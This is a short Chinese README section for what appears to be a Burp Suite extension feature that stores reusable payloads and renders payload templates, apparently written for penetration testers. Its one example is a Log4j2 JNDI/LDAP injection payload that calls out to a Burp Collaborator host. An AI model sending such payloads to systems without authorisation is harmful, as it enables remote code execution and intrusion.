# Payload

存储常用的payload，便于在repeater中利用

> 支持payload模板渲染，例如在log4j2的测试中，可以通过模板配置表达式，模板渲染时通过表达式调用Burp的Collaborator生成dns domain，再组装成payload

```
$${jndi:ldap://${BurpUtil.generateCollaboratorPayload()}}
```

> 此处{jndi前使用双$是因为该payload格式与渲染字符串的表达式标记格式正好相符，两个$$相当于转义

